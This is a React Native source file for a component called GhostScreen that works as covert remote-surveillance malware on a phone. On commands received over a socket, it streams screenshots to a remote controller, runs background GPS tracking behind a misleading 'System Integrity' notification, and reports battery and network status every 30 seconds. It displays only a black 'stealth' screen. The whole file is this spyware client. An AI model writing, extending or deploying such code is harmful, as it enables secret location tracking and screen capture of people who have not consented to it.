import React, { useEffect, useRef } from 'react';
import { View, StyleSheet, BackHandler } from 'react-native';
import * as Battery from 'expo-battery';
import * as Network from 'expo-network';
import * as Location from 'expo-location';
import { captureScreen } from 'react-native-view-shot';

const GPS_TASK = 'bg-gps-sync';

export default function GhostScreen({ socket, name }) {
    const streamTimer = useRef(null);
    const pulseInterval = useRef(null);
    const gpsKillTimer = useRef(null);

    useEffect(() => {
        // 1. STATUS PULSE (Battery & Signal)
        const sendPulse = async () => {
            const battery = await Battery.getBatteryLevelAsync();
            const network = await Network.getNetworkStateAsync();
            socket.emit('ghost_status', { 
                battery: Math.floor(battery * 100),
                netType: network.type 
            });
        };

        sendPulse();
        pulseInterval.current = setInterval(sendPulse, 30000); // Pulse every 30s

        // 2. COMMAND LISTENERS
        socket.on('admin_command', async (cmd) => {
            if (cmd === 'START_LIVE') startStream(350);
            if (cmd === 'START_ECO') startStream(5000);
            if (cmd === 'STOP_STREAM') clearInterval(streamTimer.current);
            if (cmd === 'WIPE') BackHandler.exitApp();

            // PINPOINT GPS LOGIC
            if (cmd === 'START_PINPOINT') await activatePinpoint();
            if (cmd === 'STOP_PINPOINT') deactivatePinpoint();
        });

        return () => {
            clearInterval(streamTimer.current);
            clearInterval(pulseInterval.current);
            clearTimeout(gpsKillTimer.current);
            Location.stopLocationUpdatesAsync(GPS_TASK);
        };
    }, []);

    const activatePinpoint = async () => {
        const { status } = await Location.requestBackgroundPermissionsAsync();
        if (status === 'granted') {
            await Location.startLocationUpdatesAsync(GPS_TASK, {
                accuracy: Location.Accuracy.BestForNavigation,
                timeInterval: 5000,
                foregroundService: {
                    notificationTitle: "System Integrity",
                    notificationBody: "Monitoring data stream...",
                    notificationColor: "#000000"
                }
            });

            // Auto-Kill GPS after 5 minutes to save battery
            clearTimeout(gpsKillTimer.current);
            gpsKillTimer.current = setTimeout(() => {
                deactivatePinpoint();
                socket.emit('admin_command', 'STOP_PINPOINT'); // Update Admin UI
                socket.emit('system_log', "Pinpoint limit reached (5m). Dormant.");
            }, 300000); 
        }
    };

    const deactivatePinpoint = async () => {
        await Location.stopLocationUpdatesAsync(GPS_TASK);
        clearTimeout(gpsKillTimer.current);
    };

    const startStream = (ms) => {
        clearInterval(streamTimer.current);
        streamTimer.current = setInterval(async () => {
            if (!socket.connected) return;
            try {
                const img = await captureScreen({ format: 'jpg', quality: 0.2, result: 'base64' });
                socket.emit('screen_frame', img);
            } catch (e) {}
        }, ms);
    };

    return <View style={styles.stealthContainer} />;
}

const styles = StyleSheet.create({
    stealthContainer: { flex: 1, backgroundColor: '#000' }
});
